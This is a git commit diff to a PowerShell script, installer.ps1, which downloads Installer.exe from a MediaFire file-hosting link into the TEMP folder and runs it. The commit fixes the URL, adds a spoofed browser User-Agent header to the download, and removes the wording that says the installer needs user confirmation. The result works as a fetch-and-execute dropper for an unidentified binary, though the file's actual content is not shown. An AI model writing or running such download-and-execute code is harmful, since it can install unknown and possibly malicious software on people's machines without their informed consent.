9222c226f35c4d1d927eef8421d9e77f2fd63b37
zta2 <srsazam@gmail.com>
2026-02-03 11:21:21 +0300

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -1,9 +1,12 @@
-$url = "
-https://download1500.mediafire.com/s6bkxdthw2vg2XRcJcZvfglwnSNyaF6LKnAgeIUntHDbyy5maau44MdyRc2Wo7RJXqG20-njA2H02nRTxBJD2AscfsIZE03eZyt7t-1EepXOi7tD8iPCBKYscXLe8ayNMFp5RXh2nhZxB6aiNLNK792RfLVpAoLXUciLHRRP4JCK/fv85qk44ehjq6t6/Installer.exe"
+$url = "https://download1500.mediafire.com/s6bkxdthw2vg2XRcJcZvfglwnSNyaF6LKnAgeIUntHDbyy5maau44MdyRc2Wo7RJXqG20-njA2H02nRTxBJD2AscfsIZE03eZyt7t-1EepXOi7tD8iPCBKYscXLe8ayNMFp5RXh2nhZxB6aiNLNK792RfLVpAoLXUciLHRRP4JCK/fv85qk44ehjq6t6/Installer.exe"
 $output = "$env:TEMP\Installer.exe"
 
 Write-Host "Downloading software installer..."
-Invoke-WebRequest -Uri $url -OutFile $output
 
-Write-Host "Starting installer (requires user confirmation)..."
+Invoke-WebRequest `
+    -Uri $url `
+    -OutFile $output `
+    -Headers @{ "User-Agent" = "Mozilla/5.0" }
+
+Write-Host "Starting installer..."
 Start-Process -FilePath $output -Wait
